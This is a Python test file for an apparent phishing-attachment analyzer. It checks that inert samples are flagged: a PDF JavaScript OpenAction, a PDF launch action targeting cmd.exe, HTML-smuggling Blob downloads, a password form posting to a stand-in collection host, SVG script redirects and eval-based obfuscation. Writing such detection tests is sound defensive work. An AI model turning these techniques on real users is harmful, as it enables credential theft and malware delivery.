"""Tests for phishlens.analyzers.documents (PDF, HTML, SVG). PDFs are generated with pypdf in
the test; the "scripts" are inert strings that are never run."""

from __future__ import annotations

import io
from pathlib import Path

import pytest
from pypdf import PdfWriter
from pypdf.annotations import Link
from pypdf.generic import ArrayObject, DictionaryObject, NameObject, TextStringObject

from phishlens.analyzers import documents, qr
from phishlens.analyzers.documents import analyze_html, analyze_pdf, is_html_type, is_pdf_type
from phishlens.parser import parse_email

FIXTURES = Path(__file__).parent / "fixtures"


def _flags(report) -> dict:
    return dict(report.flags)


def _pdf(build) -> bytes:
    writer = PdfWriter()
    writer.add_blank_page(200, 200)
    build(writer)
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def _action(kind: str, **entries) -> DictionaryObject:
    action = DictionaryObject({NameObject("/S"): NameObject(kind)})
    for key, value in entries.items():
        action[NameObject(f"/{key}")] = TextStringObject(value)
    return action


def test_type_helpers() -> None:
    assert is_pdf_type("application/pdf") and not is_pdf_type("text/html")
    assert is_html_type("text/html") and is_html_type("image/svg+xml")


def test_plain_pdf_is_clean() -> None:
    report = analyze_pdf(_pdf(lambda w: None))
    assert report.flags == [] and report.errors == [] and report.info["pages"] == 1


def test_pdf_javascript_and_open_action() -> None:
    def build(writer: PdfWriter) -> None:
        writer._root_object[NameObject("/OpenAction")] = _action("/JavaScript", JS="var x=1;")

    flags = _flags(analyze_pdf(_pdf(build)))
    assert flags["pdf_javascript"]["keys"] == ["/JS"]
    assert flags["pdf_auto_action"]["actions"] == ["OpenAction:/JavaScript"]


def test_open_action_destination_is_not_flagged() -> None:
    """/OpenAction [page /Fit] only sets the initial view: harmless."""

    def build(writer: PdfWriter) -> None:
        writer._root_object[NameObject("/OpenAction")] = ArrayObject(
            [writer.pages[0].indirect_reference, NameObject("/Fit")]
        )

    assert analyze_pdf(_pdf(build)).flags == []


def test_pdf_launch_action_is_critical_flag() -> None:
    def build(writer: PdfWriter) -> None:
        page = writer.pages[0]
        page[NameObject("/AA")] = DictionaryObject(
            {NameObject("/O"): _action("/Launch", F="cmd.exe")}
        )

    flags = _flags(analyze_pdf(_pdf(build)))
    assert flags["pdf_launch_action"]["targets"] == ["cmd.exe"]
    assert flags["pdf_auto_action"]["actions"] == ["AA/O:/Launch"]


def test_pdf_embedded_file_and_uri() -> None:
    def build(writer: PdfWriter) -> None:
        writer.add_attachment("invoice.exe", b"MZ harmless stub")
        writer.add_annotation(0, Link(rect=(10, 10, 50, 50), url="https://pdf-link.example.test/x"))

    report = analyze_pdf(_pdf(build))
    assert _flags(report)["pdf_embedded_file"]["names"] == ["invoice.exe"]
    assert report.urls == ["https://pdf-link.example.test/x"]


def test_broken_pdf_is_an_error_not_an_exception() -> None:
    report = analyze_pdf(b"%PDF-1.7\nthis is not a real pdf")
    assert report.flags == []


def test_pdf_qr_decoding_unavailable_is_recorded(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(documents, "qr_available", lambda: False)
    report = analyze_pdf(_pdf(lambda w: None))
    assert report.info["qr_decoding"] == "unavailable (zbar not installed)"


@pytest.mark.skipif(not qr.qr_available(), reason="zbar not installed (docs/SETUP_NOTES.md)")
def test_pdf_qr_code_in_image() -> None:
    import segno
    from PIL import Image

    png = io.BytesIO()
    segno.make("https://qr-in-pdf.example.test/").save(png, kind="png", scale=8)
    image = Image.open(io.BytesIO(png.getvalue())).convert("RGB")
    pdf = io.BytesIO()
    image.save(pdf, format="PDF")
    assert analyze_pdf(pdf.getvalue()).qr_urls == ["https://qr-in-pdf.example.test/"]


# --- HTML / SVG ---------------------------------------------------------------------------------


def test_fixture_10_html_smuggling() -> None:
    email = parse_email((FIXTURES / "html_smuggling.eml").read_bytes())
    report = analyze_html(email.attachments[0].data, "text/html")
    patterns = _flags(report)["html_smuggling"]["patterns"]
    assert {"blob", "object_url", "download", "decode"} <= set(patterns)


def test_ms_save_blob_variant() -> None:
    html = b"<script>var b = new Blob([x]); navigator.msSaveOrOpenBlob(b, 'a.iso');</script>"
    assert "html_smuggling" in _flags(analyze_html(html, "text/html"))


def test_blob_without_download_is_not_smuggling() -> None:
    html = b"<script>var b = new Blob(['chart data']); show(b);</script>"
    assert "html_smuggling" not in _flags(analyze_html(html, "text/html"))


def test_credential_form() -> None:
    html = b"""<html><body><form action="https://collect.example.test/p" method="post">
    <input name="email"><input type="Password" name="pw"><button>Sign in</button>
    </form></body></html>"""
    report = analyze_html(html, "text/html")
    assert _flags(report)["credential_form_attachment"] == {
        "password_fields": 1,
        "form_actions": ["https://collect.example.test/p"],
    }
    assert "https://collect.example.test/p" in report.urls


def test_svg_script_and_redirect() -> None:
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg" onload="go()">
    <script>function go(){ window.location.href = "https://svg-redirect.example.test/l"; }</script>
    </svg>"""
    report = analyze_html(svg, "image/svg+xml")
    assert _flags(report)["svg_script"] == {"script_tags": 1, "event_handlers": True}
    assert "https://svg-redirect.example.test/l" in report.urls


def test_plain_svg_is_clean() -> None:
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>'
    assert analyze_html(svg, "image/svg+xml").flags == []


def test_obfuscated_script() -> None:
    payload = "QUJD" * 80
    html = f"<script>eval(unescape('%41%42')); var p = '{payload}';</script>".encode()
    techniques = _flags(analyze_html(html, "text/html"))["obfuscated_script"]["techniques"]
    assert {"eval", "unescape", "long_base64"} <= set(techniques)


def test_links_meta_refresh_and_utf16() -> None:
    html = (
        '<html><head><meta http-equiv="refresh" content="0; url=https://meta.example.test/r">'
        '</head><body><a href="https://a.example.test/">x</a><img src="/local.png">'
        "<a href=\"mailto:x@example.test\">m</a></body></html>"
    ).encode("utf-16")
    report = analyze_html(html, "text/html")
    assert report.urls == ["https://meta.example.test/r", "https://a.example.test/"]
    assert report.flags == []
